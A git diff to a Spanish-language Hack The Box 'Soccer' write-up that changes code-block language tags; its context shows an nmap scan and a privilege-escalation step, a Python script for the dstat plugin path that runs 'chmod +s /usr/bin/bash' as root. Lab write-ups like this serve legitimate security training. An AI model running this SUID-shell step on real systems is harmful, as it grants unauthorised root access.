@@ -23,7 +23,7 @@ tags:
 
 ## Portscan
 
-```nmap
+```bash
 Nmap scan report for soccer.htb (10.10.11.194)                                                                                                                                                                    
 Host is up (0.063s latency).                                                                                                                                                                                      
 Not shown: 65532 closed tcp ports (reset)                                                                                                                                                                         
@@ -100,7 +100,7 @@ Usaremos el fichero '/usr/local/share/dstat'
 
 Lo segundo que hay que hacer es crear un script en la ruta anterior que se ejecutará con permisos de root, por ejemplo añadir el bit de SUID a una shell:
 
-```bash
+```python
 import os
 
 os.system('chmod +s /usr/bin/bash')
